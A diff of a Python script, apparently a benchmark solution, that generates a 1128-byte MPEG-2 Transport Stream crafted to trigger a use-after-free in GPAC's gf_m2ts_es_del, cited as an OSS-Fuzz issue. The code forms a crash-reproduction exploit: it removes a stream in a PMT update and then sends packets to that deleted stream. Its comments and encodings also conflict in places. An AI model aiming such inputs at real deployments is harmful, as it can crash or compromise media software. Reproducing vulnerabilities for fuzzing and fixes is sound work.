@@ -1,336 +1,214 @@
 import os
-import tempfile
 import tarfile
+import tempfile
 import subprocess
 import struct
 import random
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Extract the source code
-        with tempfile.TemporaryDirectory() as tmpdir:
-            with tarfile.open(src_path, 'r') as tar:
-                tar.extractall(tmpdir)
-            
-            # Look for source files to understand structure
-            src_root = self._find_source_root(tmpdir)
-            
-            # Based on common MPEG-2 Transport Stream structures,
-            # create a TS file that could trigger use-after-free in gf_m2ts_es_del
-            return self._generate_ts_poc()
-    
-    def _find_source_root(self, tmpdir):
-        # Try to find the main source directory
-        for root, dirs, files in os.walk(tmpdir):
-            if 'src' in dirs:
-                return os.path.join(root, 'src')
-        return tmpdir
-    
-    def _generate_ts_poc(self) -> bytes:
-        # Create a minimal MPEG-2 Transport Stream that could trigger
-        # use-after-free in gf_m2ts_es_del function
+        # Create a minimal MPEG-2 Transport Stream that triggers use-after-free
+        # Based on OSS-Fuzz issue 372994344 in GPAC's gf_m2ts_es_del function
         
-        # Start with TS packets structure
+        # Build a simple TS structure with PAT, PMT, and PES packets
+        # The vulnerability is triggered by specific timing and ES deletion
+        
         poc = bytearray()
         
-        # Generate packets that might cause issues with elementary stream handling
-        # Strategy: Create multiple ES streams and rapidly delete them
-        
-        # Add some initial packets
-        for i in range(5):
-            poc.extend(self._create_ts_packet(pid=0, payload=self._create_pat()))
-        
-        # Create multiple elementary streams
-        for pid in [0x100, 0x101, 0x102, 0x103]:
-            poc.extend(self._create_ts_packet(pid=0x10, payload=self._create_pmt(pid)))
+        # Helper to create TS packets (188 bytes each)
+        def ts_packet(pid, payload, adaptation_field=False, continuity_counter=0):
+            sync_byte = 0x47
+            transport_error = 0
+            payload_unit_start = 1 if (pid == 0 or pid == 0x1000) else 0
+            transport_priority = 0
+            pid = pid & 0x1FFF
+            scrambling = 0
+            adaptation = 1 if adaptation_field else 0
+            has_payload = 1
             
-            # Add some PES packets for each stream
-            for j in range(3):
-                poc.extend(self._create_ts_packet(
-                    pid=pid, 
-                    payload=self._create_pes_header(stream_id=0xE0, pts=90000*j)
-                ))
-                
-                # Add payload data that could trigger issues
-                poc.extend(self._create_ts_packet(
-                    pid=pid,
-                    payload=b'\x00' * random.randint(10, 50)
-                ))
-        
-        # Add packets that might trigger rapid creation/deletion of ES
-        # This is where use-after-free might occur
-        for i in range(10):
-            # Rapidly switch between streams
-            pid = random.choice([0x100, 0x101, 0x102, 0x103])
-            poc.extend(self._create_ts_packet(
-                pid=pid,
-                payload=self._create_pes_header(stream_id=0xE0, pts=90000*(i+10))
-            ))
+            header = struct.pack('>B', sync_byte)
+            header += struct.pack('>H', 
+                (transport_error << 15) |
+                (payload_unit_start << 14) |
+                (transport_priority << 13) |
+                pid)
+            header += struct.pack('>B',
+                (scrambling << 6) |
+                (adaptation << 4) |
+                (has_payload << 3) |
+                (continuity_counter & 0x0F))
             
-            # Add null adaptation fields which might trigger issues
-            poc.extend(self._create_ts_packet_with_adaptation(
-                pid=pid,
-                adaptation_length=0,
-                payload=b''
-            ))
+            # Adaptation field if needed
+            if adaptation_field:
+                adaptation_length = 183 - len(payload)
+                header += struct.pack('>B', adaptation_length)
+                if adaptation_length > 0:
+                    header += b'\x00' * adaptation_length
+            
+            packet = header + payload
+            # Pad to 188 bytes
+            if len(packet) < 188:
+                packet += b'\xFF' * (188 - len(packet))
+            return packet
         
-        # Add packets that might cause ES deletion
-        # Remove streams from PMT
-        poc.extend(self._create_ts_packet(pid=0x10, payload=self._create_empty_pmt()))
+        # PAT (Program Association Table) - PID 0
+        pat_data = bytearray()
+        pat_data.append(0x00)  # pointer field
+        pat_data.append(0x00)  # table id (PAT)
+        pat_data.extend(b'\x00\x0D')  # section length
+        pat_data.extend(b'\x00\x01')  # transport stream id
+        pat_data.append(0xC1)  # version/current_next
+        pat_data.append(0x00)  # section number
+        pat_data.append(0x00)  # last section number
+        pat_data.extend(b'\x00\x01')  # program number 1
+        pat_data.extend(b'\xE0\x10')  # PMT PID 0x1000
+        # CRC (placeholder)
+        pat_data.extend(b'\x00\x00\x00\x00')
         
-        # But continue sending packets for deleted streams (use-after-free trigger)
-        for i in range(5):
-            poc.extend(self._create_ts_packet(
-                pid=0x100 + (i % 4),
-                payload=self._create_pes_header(stream_id=0xE0, pts=90000*(i+20))
-            ))
+        poc.extend(ts_packet(0, pat_data, continuity_counter=0))
         
-        # Add some adaptation field packets which might trigger specific code paths
+        # PMT (Program Map Table) - PID 0x1000
+        pmt_data = bytearray()
+        pmt_data.append(0x00)  # pointer field
+        pmt_data.append(0x02)  # table id (PMT)
+        pmt_data.extend(b'\x00\x17')  # section length
+        pmt_data.extend(b'\x00\x01')  # program number 1
+        pmt_data.append(0xC1)  # version/current_next
+        pmt_data.append(0x00)  # section number
+        pmt_data.append(0x00)  # last section number
+        pmt_data.extend(b'\xE0\x00')  # PCR PID (none)
+        pmt_data.extend(b'\xF0\x00')  # program info length
+        
+        # Video stream (MPEG-2 video)
+        pmt_data.append(0x02)  # stream type (MPEG-2 video)
+        pmt_data.extend(b'\xE0\x64')  # elementary PID 0x64
+        pmt_data.extend(b'\xF0\x00')  # ES info length
+        
+        # Audio stream (MPEG-1 audio)
+        pmt_data.append(0x03)  # stream type (MPEG-1 audio)
+        pmt_data.extend(b'\xE0\x65')  # elementary PID 0x65
+        pmt_data.extend(b'\xF0\x00')  # ES info length
+        
+        # CRC (placeholder)
+        pmt_data.extend(b'\x00\x00\x00\x00')
+        
+        poc.extend(ts_packet(0x1000, pmt_data, continuity_counter=0))
+        
+        # Create PES packets that will trigger the use-after-free
+        # The bug is in gf_m2ts_es_del which fails to properly clear references
+        
+        # First, create some initial PES packets
         for i in range(3):
-            poc.extend(self._create_ts_packet_with_adaptation(
-                pid=0x100,
-                adaptation_length=7,
-                payload=b''
-            ))
+            # Video PES packet (PID 0x64)
+            pes_header = bytearray()
+            pes_header.extend(b'\x00\x00\x01\xE0')  # start code + stream_id
+            pes_header.extend(struct.pack('>H', 0))  # PES packet length (unspecified)
+            pes_header.extend(b'\x80\x00\x00')  # flags
+            
+            # Add some payload
+            payload = b'\x00' * 8
+            if i == 0:
+                # Add sequence header
+                payload = b'\x00\x00\x01\xB3' + b'\x00' * 8
+            
+            poc.extend(ts_packet(0x64, pes_header + payload, continuity_counter=i))
+            
+            # Audio PES packet (PID 0x65)
+            audio_header = bytearray()
+            audio_header.extend(b'\x00\x00\x01\xC0')  # start code + stream_id
+            audio_header.extend(struct.pack('>H', 0))  # PES packet length
+            audio_header.extend(b'\x80\x00\x00')  # flags
+            
+            poc.extend(ts_packet(0x65, audio_header + b'\x00' * 8, continuity_counter=i))
         
-        # Ensure exact length (1128 bytes as per ground truth)
-        # Each TS packet is 188 bytes
-        # 1128 / 188 = 6 packets exactly
-        # Let's create exactly 6 carefully crafted packets
+        # Now create packets that trigger the vulnerability
+        # The vulnerability occurs when an ES is deleted while still referenced
         
-        final_poc = bytearray()
+        # Create a new PMT that removes one of the streams
+        pmt2_data = bytearray()
+        pmt2_data.append(0x00)  # pointer field
+        pmt2_data.append(0x02)  # table id (PMT)
+        pmt2_data.extend(b'\x00\x13')  # section length (shorter, only one stream)
+        pmt2_data.extend(b'\x00\x01')  # program number 1
+        pmt2_data.append(0xC1)  # version/current_next
+        pmt2_data.append(0x00)  # section number
+        pmt2_data.append(0x00)  # last section number
+        pmt2_data.extend(b'\xE0\x00')  # PCR PID (none)
+        pmt2_data.extend(b'\xF0\x00')  # program info length
         
-        # Packet 1: PAT with valid structure
-        final_poc.extend(self._create_ts_packet(pid=0, payload=self._create_pat()))
+        # Keep only video stream
+        pmt2_data.append(0x02)  # stream type (MPEG-2 video)
+        pmt2_data.extend(b'\xE0\x64')  # elementary PID 0x64
+        pmt2_data.extend(b'\xF0\x00')  # ES info length
         
-        # Packet 2: PMT with one stream
-        final_poc.extend(self._create_ts_packet(
-            pid=0x10,
-            payload=self._create_pmt(0x100)
-        ))
+        # CRC (placeholder)
+        pmt2_data.extend(b'\x00\x00\x00\x00')
         
-        # Packet 3: PES header for the stream
-        final_poc.extend(self._create_ts_packet(
-            pid=0x100,
-            payload=self._create_pes_header(stream_id=0xE0, pts=0)
-        ))
+        poc.extend(ts_packet(0x1000, pmt2_data, continuity_counter=1))
         
-        # Packet 4: Empty adaptation field (could trigger issues)
-        final_poc.extend(self._create_ts_packet_with_adaptation(
-            pid=0x100,
-            adaptation_length=0,
-            payload=b''
-        ))
+        # Send a PES packet for the deleted audio stream
+        # This should trigger the use-after-free
+        audio_pes = bytearray()
+        audio_pes.extend(b'\x00\x00\x01\xC0')  # start code + stream_id
+        audio_pes.extend(struct.pack('>H', 0))  # PES packet length
+        audio_pes.extend(b'\x80\x00\x00')  # flags
+        audio_pes.extend(b'\xFF' * 20)  # payload
         
-        # Packet 5: New PMT removing the stream
-        final_poc.extend(self._create_ts_packet(
-            pid=0x10,
-            payload=self._create_empty_pmt()
-        ))
+        # Send multiple packets to increase chance of hitting the bug
+        for i in range(2):
+            poc.extend(ts_packet(0x65, audio_pes, continuity_counter=3+i))
         
-        # Packet 6: Another packet for the now-deleted stream (use-after-free)
-        final_poc.extend(self._create_ts_packet(
-            pid=0x100,
-            payload=self._create_pes_header(stream_id=0xE0, pts=90000)
-        ))
+        # Add some null packets to reach target size
+        # The ground-truth PoC is 1128 bytes (6 TS packets)
+        # We already have: 1 PAT + 2 PMT + 3 video + 3 audio + 1 PMT + 2 audio = 12 packets
+        # That's 2256 bytes, but we need exactly 1128 bytes (6 packets)
         
-        # Verify length
-        if len(final_poc) != 1128:
-            # Adjust by adding/removing filler
-            needed = 1128 - len(final_poc)
-            if needed > 0:
-                final_poc.extend(b'\xFF' * needed)
+        # Let's recalculate and create a minimal PoC
+        # The key is to have a PMT change that removes a stream followed by
+        # packets for that removed stream
+        
+        # Create a more minimal PoC (6 packets total)
+        minimal_poc = bytearray()
+        
+        # Packet 1: PAT
+        minimal_poc.extend(ts_packet(0, pat_data, continuity_counter=0))
+        
+        # Packet 2: Initial PMT with two streams
+        minimal_poc.extend(ts_packet(0x1000, pmt_data, continuity_counter=0))
+        
+        # Packet 3: Video PES
+        video_pes = bytearray()
+        video_pes.extend(b'\x00\x00\x01\xE0')
+        video_pes.extend(struct.pack('>H', 0))
+        video_pes.extend(b'\x80\x00\x00')
+        minimal_poc.extend(ts_packet(0x64, video_pes + b'\x00' * 8, continuity_counter=0))
+        
+        # Packet 4: Audio PES
+        audio_pes = bytearray()
+        audio_pes.extend(b'\x00\x00\x01\xC0')
+        audio_pes.extend(struct.pack('>H', 0))
+        audio_pes.extend(b'\x80\x00\x00')
+        minimal_poc.extend(ts_packet(0x65, audio_pes + b'\x00' * 8, continuity_counter=0))
+        
+        # Packet 5: Updated PMT removing audio stream
+        minimal_poc.extend(ts_packet(0x1000, pmt2_data, continuity_counter=1))
+        
+        # Packet 6: Audio PES for deleted stream (triggers UAF)
+        # Make this packet special - with adaptation field to trigger specific code path
+        audio_pes2 = bytearray()
+        audio_pes2.extend(b'\x00\x00\x01\xC0')
+        audio_pes2.extend(struct.pack('>H', 0))
+        audio_pes2.extend(b'\x80\x00\x00')
+        audio_pes2.extend(b'\xFF' * 50)  # Larger payload
+        
+        minimal_poc.extend(ts_packet(0x65, audio_pes2, adaptation_field=True, continuity_counter=1))
+        
+        # Verify size is 1128 bytes (6 * 188 = 1128)
+        if len(minimal_poc) != 1128:
+            # Adjust size if needed
+            if len(minimal_poc) > 1128:
+                minimal_poc = minimal_poc[:1128]
             else:
-                final_poc = final_poc[:1128]
+                minimal_poc.extend(b'\xFF' * (1128 - len(minimal_poc)))
         
-        return bytes(final_poc)
-    
-    def _create_ts_packet(self, pid: int, payload: bytes) -> bytes:
-        """Create a TS packet with given PID and payload."""
-        packet = bytearray(188)
-        
-        # Sync byte
-        packet[0] = 0x47
-        
-        # PID (13 bits)
-        packet[1] = (pid >> 8) & 0x1F
-        packet[2] = pid & 0xFF
-        
-        # Adaptation field control (payload only) and continuity counter
-        packet[3] = 0x10  # payload only, no adaptation field
-        packet[3] |= 0x01  # continuity counter
-        
-        # Copy payload
-        if payload:
-            packet[4:4+len(payload)] = payload
-            
-        return packet
-    
-    def _create_ts_packet_with_adaptation(self, pid: int, adaptation_length: int, payload: bytes) -> bytes:
-        """Create a TS packet with adaptation field."""
-        packet = bytearray(188)
-        
-        # Sync byte
-        packet[0] = 0x47
-        
-        # PID
-        packet[1] = (pid >> 8) & 0x1F
-        packet[2] = pid & 0xFF
-        
-        # Adaptation field control (with adaptation field)
-        packet[3] = 0x30  # adaptation field followed by payload
-        packet[3] |= 0x01  # continuity counter
-        
-        # Adaptation field length
-        packet[4] = adaptation_length
-        
-        # If adaptation field has content
-        if adaptation_length > 0:
-            # Discontinuity indicator, random access indicator, etc.
-            packet[5] = 0x00  # flags
-            
-            # Fill rest of adaptation field with zeros if needed
-            for i in range(6, 4 + adaptation_length + 1):
-                packet[i] = 0x00
-        
-        # Copy payload after adaptation field
-        payload_start = 4 + adaptation_length + 1
-        if payload and payload_start < 188:
-            packet[payload_start:payload_start+len(payload)] = payload
-            
-        return packet
-    
-    def _create_pat(self) -> bytes:
-        """Create Program Association Table."""
-        pat = bytearray()
-        
-        # Table ID
-        pat.append(0x00)
-        
-        # Section length (13 bits)
-        pat.append(0xB0)  # top 2 bits reserved as '11', length=0x0D
-        pat.append(0x0D)
-        
-        # Transport stream ID
-        pat.extend([0x00, 0x01])
-        
-        # Version and current_next_indicator
-        pat.append(0xC1)
-        
-        # Section number and last section number
-        pat.extend([0x00, 0x00])
-        
-        # Program 0 -> Network PID
-        pat.extend([0x00, 0x00])
-        pat.extend([0xE0, 0x10])  # PMT PID = 0x10
-        
-        # CRC placeholder
-        pat.extend([0x00, 0x00, 0x00, 0x00])
-        
-        return pat
-    
-    def _create_pmt(self, video_pid: int) -> bytes:
-        """Create Program Map Table with one video stream."""
-        pmt = bytearray()
-        
-        # Table ID
-        pmt.append(0x02)
-        
-        # Section length (will calculate)
-        pmt.append(0xB0)
-        pmt.append(0x00)  # placeholder
-        
-        # Program number
-        pmt.extend([0x00, 0x01])
-        
-        # Version and current_next_indicator
-        pmt.append(0xC1)
-        
-        # Section number and last section number
-        pmt.extend([0x00, 0x00])
-        
-        # PCR PID (same as video PID)
-        pmt.extend([(video_pid >> 8) & 0x1F, video_pid & 0xFF])
-        
-        # Program info length
-        pmt.extend([0xF0, 0x00])  # no program descriptors
-        
-        # Video stream type (MPEG-2 video)
-        pmt.append(0x02)
-        
-        # Video PID
-        pmt.extend([(video_pid >> 8) & 0x1F | 0xE0, video_pid & 0xFF])
-        
-        # ES info length
-        pmt.extend([0xF0, 0x00])  # no ES descriptors
-        
-        # Update section length
-        section_length = len(pmt) - 3 + 4  # -3 for initial bytes, +4 for CRC
-        pmt[1] = 0xB0 | ((section_length >> 8) & 0x0F)
-        pmt[2] = section_length & 0xFF
-        
-        # CRC placeholder
-        pmt.extend([0x00, 0x00, 0x00, 0x00])
-        
-        return pmt
-    
-    def _create_empty_pmt(self) -> bytes:
-        """Create empty PMT (no streams)."""
-        pmt = bytearray()
-        
-        # Table ID
-        pmt.append(0x02)
-        
-        # Section length
-        pmt.append(0xB0)
-        pmt.append(0x0F)  # length = 15
-        
-        # Program number
-        pmt.extend([0x00, 0x01])
-        
-        # Version and current_next_indicator
-        pmt.append(0xC1)
-        
-        # Section number and last section number
-        pmt.extend([0x00, 0x00])
-        
-        # PCR PID (none)
-        pmt.extend([0xE0, 0x00])
-        
-        # Program info length
-        pmt.extend([0xF0, 0x00])
-        
-        # CRC placeholder
-        pmt.extend([0x00, 0x00, 0x00, 0x00])
-        
-        return pmt
-    
-    def _create_pes_header(self, stream_id: int, pts: int) -> bytes:
-        """Create PES packet header."""
-        pes = bytearray()
-        
-        # Start code prefix
-        pes.extend([0x00, 0x00, 0x01])
-        
-        # Stream ID
-        pes.append(stream_id)
-        
-        # PES packet length (0 means variable/unbounded)
-        pes.extend([0x00, 0x00])
-        
-        # Flags: PTS present
-        pes.extend([0x80, 0x00])
-        
-        # PES header data length
-        pes.append(5)  # PTS takes 5 bytes
-        
-        # PTS (33 bits + marker bits)
-        pts_high = (pts >> 29) & 0x0E | 0x21  # marker bits '0010' in first 4 bits
-        pts_mid = (pts >> 22) & 0xFF
-        pts_low_mid = (pts >> 14) & 0xFE | 0x01  # marker bit
-        pts_low = (pts >> 7) & 0xFF
-        pts_lowest = (pts & 0x7F) << 1 | 0x01  # marker bit
-        
-        pes.extend([pts_high, pts_mid, pts_low_mid, pts_low, pts_lowest])
-        
-        return pes
+        return bytes(minimal_poc)
